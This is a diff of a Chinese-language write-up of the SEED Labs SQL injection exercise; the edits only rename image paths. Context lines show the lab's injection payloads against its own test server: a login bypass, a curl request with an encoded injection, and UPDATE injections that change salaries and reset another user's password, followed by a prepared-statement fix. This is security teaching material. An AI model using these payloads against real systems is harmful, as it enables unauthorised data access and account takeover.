@@ -41,7 +41,7 @@ desc credential;
 select * from credential where Name='Alice'
 ```
 
-<img src="./../assets/post/images/Oz14IRuBaf3ZENS.png" alt="image-20210722144514099" style="zoom:50%;" />
+<img src="../../assets/post/images/sql1.png" alt="sql1" style="zoom:50%;" />
 
 ## Task 2: SQL Injection Attack on SELECT Statement
 
@@ -64,7 +64,7 @@ $sql = "SELECT id, name, eid, salary, birth, ssn, address, email,
 admin';#
 ```
 
-<img src="./../assets/post/images/AzXs2vQFEPSoLiY.png" alt="image-20210722145300064" style="zoom:50%;" />
+<img src="../../assets/post/images/sql2.png" alt="sql2" style="zoom:50%;" />
 
 ### Task 2.2: SQL Injection Attack from command line
 
@@ -76,7 +76,7 @@ curl 'www.seed-server.com/unsafe_home.php?username=%27%3b%23'
 
 得到
 
-<img src="./../assets/post/images/oYJ9Ep5a6I7GnsN.png" alt="image-20210722150454000" style="zoom:50%;" />
+<img src="../../assets/post/images/sql3.png" alt="sql3" style="zoom:50%;" />
 
 看到已经显示了所有用户信息
 
@@ -90,7 +90,7 @@ Alice'; update credential set name=A where ID=1;#
 
 可以看到注入不成功
 
-<img src="./../assets/post/images/EuwMNsmyAal3YjC.png" alt="image-20210722150917741" style="zoom:67%;" />
+<img src="../../assets/post/images/sql4.png" alt="sql4" style="zoom:67%;" />
 
 ## Task 3: SQL Injection Attack on UPDATE Statement
 
@@ -118,7 +118,7 @@ $conn->query($sql);
 ',salary='30000' where ID=1;#
 ```
 
-<img src="./../assets/post/images/gGiR6Q3UlqtF7Zk.png" alt="image-20210722153947448" style="zoom: 50%;" />
+<img src="../../assets/post/images/sql5.png" alt="sql5" style="zoom: 50%;" />
 
 ### Task 3.2: Modify other people’s alary
 
@@ -128,17 +128,17 @@ $conn->query($sql);
 ',salary='114514' where ID=2;#
 ```
 
-<img src="./../assets/post/images/pkiohbyqBA8dsE5.png" alt="image-20210722154549727" style="zoom:50%;" />
+<img src="../../assets/post/images/sql6.png" alt="sql6" style="zoom:50%;" />
 
 看到已经改掉了
 
-<img src="./../assets/post/images/yMn3oTgsl5bmjAQ.png" alt="image-20210722154726908" style="zoom:50%;" />
+<img src="../../assets/post/images/sql7.png" alt="sql7" style="zoom:50%;" />
 
 ### Task 3.3: Modify other people’s password
 
 查看代码，看到密码采用的是 sha1，我们随便找个在线转换网站转换一下就好了。
 
-<img src="./../assets/post/images/J1tbDONHnlpdCMr.png" alt="image-20210722155151501" style="zoom: 67%;" />
+<img src="../../assets/post/images/sql8.png" alt="sql8" style="zoom: 67%;" />
 
 然后注入
 
@@ -146,7 +146,7 @@ $conn->query($sql);
 ',Password='1f82c942befda29b6ed487a51da199f78fce7f05' where ID=1;#
 ```
 
-<img src="./../assets/post/images/GAreWY3vmxCNyaj.png" alt="image-20210722155300581" style="zoom:50%;" />
+<img src="../../assets/post/images/sql9.png" alt="sql9" style="zoom:50%;" />
 
 然后现在可以用密码 `888888` 成功登录 Alice 账号。
 
@@ -166,11 +166,11 @@ $stmt->bind_result($id, $name, $eid, $salary, $ssn);
 $stmt->fetch();
 ```
 
-<img src="./../assets/post/images/YtBRjOc6n715wDI.png" alt="image-20210724202537000" style="zoom:50%;" />
+<img src="../../assets/post/images/sql10.png" alt="sql10" style="zoom:50%;" />
 
 可以看到，攻击失败了
 
-<img src="./../assets/post/images/CFiGfJ219y7SDIB.png" alt="image-20210724201943781" style="zoom:50%;" />
+<img src="../../assets/post/images/sql11.png" alt="sql11" style="zoom:50%;" />
 
 ## 实验总结
 
